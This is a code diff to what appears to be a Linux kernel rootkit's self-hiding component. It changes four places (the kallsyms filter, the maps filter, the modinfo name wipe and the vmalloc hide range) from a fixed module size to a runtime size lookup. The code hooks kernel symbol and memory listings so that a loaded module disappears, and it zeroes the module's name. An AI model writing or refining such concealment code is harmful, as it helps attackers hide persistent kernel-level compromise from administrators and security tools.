@@ -197,7 +197,7 @@ int neverc_krt_mod_kallsyms_filter(struct neverc_krt_hide_state *state,
 
 	unsigned char *mod_base = (unsigned char *)&__this_module;
 	_neverc_krt_hide_mod_start = (unsigned long)mod_base;
-	_neverc_krt_hide_mod_end = _neverc_krt_hide_mod_start + NEVERC_KRT_MODULE_SIZE;
+	_neverc_krt_hide_mod_end = _neverc_krt_hide_mod_start + _neverc_krt_get_module_size();
 
 	int ret = neverc_krt_hook_install(&_neverc_krt_ks_hook, target,
 				   (void *)_neverc_krt_mod_text_addr_filter,
@@ -509,7 +509,7 @@ void neverc_krt_maps_filter_add_self(void)
 {
 	unsigned char *mod_base = (unsigned char *)&__this_module;
 	unsigned long start = (unsigned long)mod_base;
-	unsigned long end = start + NEVERC_KRT_MODULE_SIZE;
+	unsigned long end = start + _neverc_krt_get_module_size();
 	neverc_krt_maps_filter_add(start, end);
 }
 
@@ -518,7 +518,7 @@ void neverc_krt_mod_wipe_modinfo(struct neverc_krt_this_module *mod)
 	volatile unsigned char *p = (volatile unsigned char *)mod;
 	unsigned long i;
 	unsigned long name_start = NEVERC_KRT_OFF_NAME;
-	for (i = name_start; i < name_start + 56 && i < NEVERC_KRT_MODULE_SIZE; i++)
+	for (i = name_start; i < name_start + 56 && i < _neverc_krt_get_module_size(); i++)
 		p[i] = 0;
 }
 
@@ -559,7 +559,7 @@ int neverc_krt_mod_vmalloc_filter(void)
 
 	_neverc_krt_vmalloc_hide_start = (unsigned long)&__this_module;
 	_neverc_krt_vmalloc_hide_end = _neverc_krt_vmalloc_hide_start +
-				NEVERC_KRT_MODULE_SIZE + 0x10000;
+				_neverc_krt_get_module_size() + 0x10000;
 
 	target = _neverc_krt_resolve_vmalloc_s_show();
 	if (!target) return -1;
